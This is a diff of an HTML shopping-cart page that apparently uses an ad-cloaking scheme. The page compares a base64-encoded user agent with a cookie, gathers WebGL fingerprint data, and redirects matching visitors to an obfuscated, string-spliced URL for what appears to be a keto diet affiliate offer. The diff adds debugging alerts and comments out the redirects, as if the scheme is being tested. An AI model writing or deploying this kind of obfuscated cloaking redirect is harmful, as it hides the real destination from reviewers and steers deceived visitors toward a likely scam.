@@ -182,7 +182,7 @@
 	var url = param['url'];
 	var utm_term = param['utm_term'];
 	</script>
-	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js" integrity="sha512-bLT0Qm9VnAYZDflyKcBaQ2gg0hSYNQrJ8RilYldYQ1FxQYoCLtUjuuRuZo+fjqhx/qtq/1itJ0C2ejDxltZVFg==" crossorigin="anonymous"></script>
 	<script src="https://cdn.jsdelivr.net/npm/js-cookie@rc/dist/js.cookie.min.js"></script>
 </head>
 <body class="template-cart">
@@ -237,7 +237,8 @@
 	var useragent=navigator.userAgent;
 	var myuseragent1 = btoa(useragent);
 	var myuseragent2 = Cookies.get('u');
-	
+	alert (myuseragent1);
+	alert (myuseragent2);
 	var canvas = document.createElement('canvas');
 	var gl;
 	var debugInfo;
@@ -306,10 +307,10 @@
 	if ((myuseragent1==myuseragent2)) {
 		var url = 'ht'+'tp:/'+'/cou'+'nt'+'erwe'+'b.'+'site/l'+'1/ke'+'tobo'+'dytr'+'im/r1/?lnk=20'+'029&s=a2oUG'+'J7e&sub2='+'11&s'+'ub3='+utm_term;
 		var url2 = "products.html";
-		window.location.href = url;
+		//window.location.href = url;
 	} else {
 		var url = "subscribe.html";
-		setTimeout( 'location="' + url + '";', 3000 );
+		//setTimeout( 'location="' + url + '";', 3000 );
 	};	
 	
 	Cookies.remove('u');
